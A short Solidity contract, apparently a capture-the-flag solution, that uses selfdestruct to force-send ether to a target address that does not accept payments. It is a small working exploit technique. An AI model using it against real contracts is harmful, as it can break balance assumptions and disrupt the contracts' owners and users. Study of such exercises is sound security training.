//"SPDX-License-Identifier: MIT"
pragma solidity ^0.8.7;

contract ForceAttack {
  function attack(address payable _address) external payable {
    selfdestruct(_address);
  }

  receive() external payable {}
}